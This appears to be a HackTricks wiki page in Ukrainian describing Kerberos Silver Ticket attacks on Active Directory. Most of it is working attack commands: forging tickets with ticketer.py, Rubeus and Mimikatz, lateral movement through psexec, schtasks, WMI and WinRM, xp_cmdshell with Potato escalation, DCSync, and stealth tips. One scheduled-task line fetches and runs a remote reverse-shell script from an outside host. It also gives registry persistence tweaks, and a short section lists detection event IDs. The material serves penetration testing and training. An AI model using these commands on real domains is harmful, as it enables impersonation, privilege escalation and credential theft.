# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Атака **Silver Ticket** передбачає експлуатацію service tickets у середовищах Active Directory (AD). Цей метод ґрунтується на **отриманні NTLM hash service account**, наприклад computer account, для підробки Ticket Granting Service (TGS) ticket. За допомогою цього підробленого ticket зловмисник може отримати доступ до певних сервісів у мережі, **видаючи себе за будь-якого користувача**, зазвичай націлюючись на адміністративні привілеї. Наголошується, що використання AES keys для підробки tickets є безпечнішим і менш помітним.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Tickets менш помітні, ніж Golden Tickets, оскільки для них потрібен лише **hash service account**, а не account krbtgt. Проте вони обмежені конкретним сервісом, на який націлені. Крім того, достатньо просто викрасти пароль користувача.
Крім того, якщо ви скомпрометуєте **пароль account із SPN**, ви зможете використати цей пароль для створення Silver Ticket, який видає вас за будь-якого користувача цього сервісу.

### Сучасні зміни Kerberos (домени лише з AES)

- Оновлення Windows, починаючи з **8 листопада 2022 року (KB5021131)**, за можливості використовують **AES session keys** для service tickets за замовчуванням і поступово виводять RC4 з використання. Очікується, що до середини **2026 року** DC постачатимуться з **вимкненим RC4** за замовчуванням, тому використання NTLM/RC4 hashes для silver tickets дедалі частіше завершується помилкою `KRB_AP_ERR_MODIFIED`. Завжди отримуйте **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) цільового service account.<sup>[[5]](#references)</sup>
- Якщо для service account параметр `msDS-SupportedEncryptionTypes` обмежено AES, потрібно виконувати підробку з `/aes256` або `-aesKey`; RC4 (`/rc4` або `-nthash`) не працюватиме, навіть якщо у вас є NTLM hash.<sup>[[6]](#references)</sup>
- gMSA/computer accounts змінюються кожні 30 днів; перед підробкою отримайте **поточний AES key** із LSASS, Secretsdump/NTDS або DCsync.
- OPSEC: стандартний час життя ticket у tools часто становить **10 років**; встановлюйте реалістичну тривалість (наприклад, `-duration 600` хвилин), щоб уникнути виявлення через аномальний час життя.<sup>[[6]](#references)</sup>

Для створення tickets використовуються різні tools залежно від операційної системи:

### У Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### У Windows
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Сервіс CIFS позначається як поширена ціль для доступу до файлової системи жертви, але інші сервіси, як-от HOST і RPCSS, також можна експлуатувати для виконання завдань і WMI-запитів.

### Приклад: сервіс MSSQL (MSSQLSvc) + Potato до SYSTEM

Якщо у вас є NTLM hash (або AES key) облікового запису SQL-сервісу (наприклад, sqlsvc), ви можете підробити TGS для MSSQL SPN і видати себе за будь-якого користувача під час доступу до SQL-сервісу. Після цього увімкніть xp_cmdshell, щоб виконувати команди від імені облікового запису SQL-сервісу. Якщо цей token має SeImpersonatePrivilege, використайте Potato для підвищення привілеїв до SYSTEM.<sup>[[4]](#references)</sup>
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Якщо отриманий контекст має SeImpersonatePrivilege (часто це так для service accounts), використайте варіант Potato, щоб отримати SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Детальніше про зловживання MSSQL та ввімкнення xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Огляд технік Potato:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Доступні служби

| Тип служби                                 | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Залежно від ОС також:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>У деяких випадках можна просто запросити: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, також psexec           | CIFS                                                                       |
| LDAP operations, включно з DCSync          | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

За допомогою **Rubeus** можна **запросити всі** ці квитки, використовуючи параметр:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Event IDs для Silver tickets

- 4624: Вхід облікового запису
- 4634: Вихід облікового запису
- 4672: Вхід адміністратора
- **Відсутність попередніх 4768/4769 на DC** для того самого клієнта/служби є поширеною ознакою того, що підроблений TGS було безпосередньо передано службі.
- Аномально тривалий термін дії квитка або неочікуваний тип шифрування (RC4, коли домен застосовує AES) також помітні в даних 4769/4624.

## Persistence

Щоб запобігти зміні машинами своїх паролів кожні 30 днів, встановіть `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` або задайте для `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` значення, більше за 30 днів, щоб указати період ротації, коли пароль машини має бути змінений.<sup>[[3]](#references)</sup>

## Abusing Service tickets

У наступних прикладах уявімо, що квиток отримано шляхом impersonation облікового запису адміністратора.

### CIFS

За допомогою цього квитка ви зможете отримати доступ до папок `C$` і `ADMIN$` через **SMB** (якщо вони доступні) та копіювати файли до частини віддаленої файлової системи, просто виконавши щось на кшталт:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Ви також зможете отримати shell усередині хоста або виконувати довільні команди за допомогою **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

За допомогою цього дозволу ви можете створювати заплановані завдання на віддалених комп'ютерах і виконувати довільні команди:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

За допомогою цих tickets ви можете **виконувати WMI у системі жертви**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Знайдіть **більше інформації про wmiexec** на цій сторінці:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Маючи доступ до winrm через комп'ютер, ви можете **отримати до нього доступ** і навіть отримати PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Перевірте цю сторінку, щоб дізнатися про **інші способи підключення до віддаленого хоста за допомогою winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Зверніть увагу, що **winrm має бути активним і прослуховувати підключення** на віддаленому комп’ютері, щоб отримати до нього доступ.

### LDAP

Маючи цей привілей, ви можете виконати дамп бази даних DC за допомогою **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Дізнайтеся більше про DCSync** на цій сторінці:


{{#ref}}
dcsync.md
{{#endref}}


## Посилання

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Як атакувати Kerberos? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Процес роботи з паролем облікового запису комп'ютера - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: шлях Silver Ticket + Potato](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131: посилення Kerberos і припинення підтримки RC4](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Поточні опції Impacket ticketer.py (AES/keytab/тривалість)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)

{{#include ../../banners/hacktricks-training.md}}
